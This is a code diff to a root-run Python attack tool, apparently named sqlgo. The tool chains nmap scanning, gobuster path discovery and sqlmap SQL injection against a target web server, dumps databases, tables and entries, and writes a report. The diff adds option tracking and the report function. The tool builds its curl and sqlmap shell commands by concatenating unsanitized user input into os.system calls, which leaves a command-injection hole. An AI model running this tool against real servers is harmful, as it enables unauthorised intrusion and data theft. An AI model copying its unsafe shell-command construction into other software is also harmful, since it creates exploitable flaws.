@@ -3,6 +3,7 @@
 import os
 import nmap
 
+flag = [False, False, False]
 
 if os.geteuid() != 0:
     print("\nYou must run this script as a root user.\n")
@@ -21,6 +22,8 @@ def nmap_scan():
     nm.scan(hosts = ip_addr, arguments = '--open -n -sV -p80,443')
     num = 0
 
+
+
     #exit if nothing scanned
     if  len(nm.all_hosts()) == 0:
         print()
@@ -33,7 +36,7 @@ def nmap_scan():
     for host in nm.all_hosts():
         num+= 1
         print ('---------------------------')
-        print ([num] ,host, '- state:', nm[host].state())
+        print ([num], host, '| State:', nm[host].state(), ' | Version:', nm[host]['tcp'][80]['product'], nm[host]['tcp'][80]['version'], nm[host]['tcp'][80]['extrainfo'])
     print()
 
     print('Now, lets look for hidden paths in the webserver that could be exploitable')
@@ -128,8 +131,7 @@ def inject_options_output():
         print(counter, option, "\n")
         counter += 1
     option = input("\nPlease type the corresponding type number: ")
-    option_chosen = int(option)
-    return option_chosen
+    return option
 
 def sqlmap(webserver, hidden_path, option_chosen):
 
@@ -140,18 +142,37 @@ def sqlmap(webserver, hidden_path, option_chosen):
         cookie = parseCookie()
         option2 = "--cookie=\"PHPSESSID=" + cookie + ";security_level=0\" " + " --data=\"login=test&password=test&form=submit\""
     """
+
+
+    global flag
+
     result = ""
+    if option_chosen == "1" or option_chosen == "2" or option_chosen == "3":
+        option_chosen = int(option_chosen)
+
+    else:
+        return "error", ["error"]
 
     if option_chosen == 1:
+        flag[0] = True
         base_cmd = "sqlmap -u " + "\"http://" + webserver + hidden_path + "/" + "?id=1&Submit=Submit#\""
 
-    if option_chosen == 2 or option_chosen == 3:
+    if option_chosen == 2:
+        flag[1] = True
+        curlcmd = "curl " + webserver + hidden_path + " > /usr/share/sqlgo/curloutput.txt"
+        os.system(curlcmd)
+        paramstring = parseCurl()
+        base_cmd = "sqlmap -u " + "\"http://" + webserver + hidden_path + "\" " + "--data=" + paramstring
+
+    if option_chosen == 3:
+        flag[2] = True
         curlcmd = "curl " + webserver + hidden_path + " > /usr/share/sqlgo/curloutput.txt"
         os.system(curlcmd)
         paramstring = parseCurl()
         base_cmd = "sqlmap -u " + "\"http://" + webserver + hidden_path + "\" " + "--data=" + paramstring
 
     cmd = base_cmd + " --dbs  --batch " + " > /usr/share/sqlgo/sqlmapoutput.txt"
+
 
     #print(cmd)
     try:
@@ -331,7 +352,44 @@ def info():
     else:
         exit(0)
 
+def output_file():
+    response = input("Would you like to create a report including nmap, gobuster, and SQLMAP scans? Type 'y' for yes, anything else for no")
+    if response == "y":
+
+        f = open('/usr/share/sqlgo/sqlgo_report.txt', 'w+')
+        f.write("BEGINNING OF REPORT\n")
+
+        f.write("\nGOBUSTER OUTPUT - HIDDEN PATHS FOUND")
+        f.write("\n")
+        with open('/usr/share/sqlgo/gobusteroutput.txt', 'r') as file:
+            data = file.read()
+        f.write(data)
+
+        f.write("\nSQLMAP OUTPUT - DATABASES FOUND")
+        f.write("\n")
+        with open('/usr/share/sqlgo/sqlmapoutput.txt', 'r') as file:
+            data = file.read()
+        f.write(data)
+
+        f.write("\nSQLMAP OUTPUT - TABLES FOUND")
+        f.write("\n")
+        with open('/usr/share/sqlgo/sqlmapdb.txt', 'r') as file:
+            data = file.read()
+        f.write(data)
+
+        f.write("\nSQLMAP OUTPUT - ENTRIES FOUND")
+        f.write("\n")
+        with open('/usr/share/sqlgo/sqlmapdata.txt', 'r') as file:
+            data = file.read()
+        f.write(data)
+
+        f.write("END OF REPORT")
+
+
+
 def execute_sqlgo():
+    global flag
+
     if(os.path.exists('/usr/share/sqlgo/')): #clears folder if it exists to avoid having information from two seperate application runs
         cmd = "rm -r /usr/share/sqlgo"
         try:
@@ -353,6 +411,15 @@ def execute_sqlgo():
     option_chosen = inject_options_output()
     base_cmd, database_list = sqlmap(webserver, hidden_path, option_chosen)
     while base_cmd == "error":
+        if flag[0] and flag[1] and flag[2]:
+            print("All options of SQLMap have been chosen. This path is not vulnerable to SQL injection.")
+            userinput = input("Press 'q' to quit the application or anything to display the hidden paths again: ")
+            if userinput == 'q':
+                exit(0)
+            else:
+                os.system("cat /usr/share/sqlgo/gobust.txt")
+                flag = [False, False, False]
+                hidden_path = getHiddenPath()
         option_chosen=inject_options_output()
         base_cmd, database_list = sqlmap(webserver, hidden_path, option_chosen)
 
@@ -375,6 +442,8 @@ def execute_sqlgo():
             print(table)
         print()
         datastatus = table_dump(base_cmd, status)
+
+    output_file()
 
 if __name__ == "__main__":
     response = intro()
